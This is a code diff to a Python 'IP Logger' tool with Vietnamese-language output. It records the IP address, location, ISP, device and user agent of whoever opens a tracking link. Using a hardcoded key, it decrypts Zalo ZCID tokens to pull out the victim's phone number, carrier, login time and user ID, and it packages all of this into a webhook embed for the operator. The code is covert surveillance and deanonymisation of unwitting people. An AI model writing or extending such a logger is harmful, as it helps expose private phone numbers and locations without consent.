@@ -15,6 +15,7 @@ import json
 import hashlib
 import binascii
 import re
+import pytz
 import codecs
 config = {
     # BASE CONFIG #
@@ -141,7 +142,7 @@ def generate_random_string(length):
 
     return random_string
 def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename, token, url_thumnail, type ,id, zalo=None):
-    info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Di động: {ip_info['mobile']}, Proxy: {ip_info['proxy']}, Hosting: {ip_info['hosting']}\n6. {type}{id}\n7.Phone:{zalo}"
+    info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Phone:{zalo}"
     embed = {
         "username": "IP Logger",
         "avatar_url": url_thumnail,
@@ -158,12 +159,30 @@ def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename
     }
     return embed
 
-def convert_time(timestring):
+# def convert_time(timestring):
+#     timestring_int = int(timestring)
+#     utc_time = datetime.datetime.fromtimestamp(
+#         timestring_int / 1000
+#     ).strftime("%H:%M:%S %d-%m-%Y")
+#     return utc_time
+
+def convert_time_utc_7(timestring):
+    # Convert the timestamp string to an integer
     timestring_int = int(timestring)
-    utc_time = datetime.datetime.fromtimestamp(
-        timestring_int / 1000
-    ).strftime("%H:%M:%S %d-%m-%Y")
-    return utc_time
+    
+    # Convert the timestamp to UTC time
+    utc_time = datetime.datetime.fromtimestamp(timestring_int / 1000, pytz.utc)
+    
+    # Define the UTC+7 timezone
+    utc_plus_7 = pytz.timezone('Asia/Bangkok')
+    
+    # Convert the UTC time to UTC+7 time
+    local_time = utc_time.astimezone(utc_plus_7)
+    
+    # Format the time as a string
+    formatted_time = local_time.strftime("%H:%M:%S %d-%m-%Y")
+    
+    return formatted_time
 
 def deMessage(e,key):
     try:
@@ -204,8 +223,11 @@ def decrypt_zcid(e, key):
 
 
 
-def checkinfo(t_md, ZCID, networktype, operator, useragent=None):
- 
+def checkinfo(t_md, ZCID, networktype, operator, useragent='', viewerkey=None):
+    
+    uid = '0'
+    if viewerkey:
+        uid = viewerkey.split('.')[0]
     if ZCID:
         operator_name = get_operator(operator)
         zcid_data = decrypt_zcid(ZCID, 'IXX3RM3GABH3NS0AED3VV04N9ABCDA1D')
@@ -213,15 +235,24 @@ def checkinfo(t_md, ZCID, networktype, operator, useragent=None):
         # Extract the timestamp
         timestamp = parts[3]
         if networktype == '0':
-            return f'Phone: {parts[2]} - mạng: wifi - mạng di động: {operator_name} - LoginTime:{convert_time(timestamp)}'
+            return f' {parts[2]} - mạng: Wifi - mạng di động: {operator_name} - LoginTime: {convert_time_utc_7(timestamp)} - UID: {uid}'
         else:
-            return f'Phone: {parts[2]} - mạng: LTE - mạng di động: {operator_name} - LoginTime:{convert_time(timestamp)}'
+            return f' {parts[2]} - mạng: LTE - mạng di động: {operator_name} - LoginTime: {convert_time_utc_7(timestamp)} - UID: {uid}'
     if t_md:
-        return 'Loại thiết bị: Apple'
+        if networktype == '1':
+            return f' Loại thiết bị Apple - Mạng: Wifi - UID: {uid}'
+        if networktype == '2':
+            return f' Loại thiết bị Apple - Mạng: LTE - UID: {uid}'
+        if useragent and 'network' in useragent:
+            return f' Loại thiết bị Apple - network: {networktype} - UID: {uid}'
+        if useragent and 'zalo' in useragent:
+            return f'Zalo PC - network: {networktype} - UID: {uid} - t_md: {t_md}'
     else:
-        if 'zplayer' in useragent:
-            return 'Loại thiết bị: Apple'
-    return 'Không phải thiết bị di động'
+        if useragent and 'network' in useragent:
+            return ' Loại thiết bị Apple'
+        if useragent and 'zalo' in useragent:
+                return 'Zalo PC'
+    return 'Trình duyệt' if useragent and 'Mozilla' in useragent else 'Thiết bị không xác định'
 
 def get_operator(mnc):
     switcher = {
